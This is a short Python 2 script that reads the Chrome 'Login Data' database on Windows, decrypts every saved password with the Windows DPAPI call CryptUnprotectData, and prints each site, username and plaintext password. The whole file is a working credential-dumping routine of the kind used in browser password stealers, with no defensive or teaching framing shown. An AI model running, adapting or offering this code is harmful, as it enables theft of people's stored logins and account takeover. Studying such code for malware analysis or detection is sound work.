from os import getenv
import sqlite3
import win32crypt
from os.path import abspath

db_path = (getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data")

print abspath(db_path)
if db_path:
    print db_path
    conn = sqlite3.connect(db_path)

print conn
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    # Decrypt the Password
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print 'Site: ' + result[0]
        print 'Username: ' + result[1]
        print 'Password: ' + password
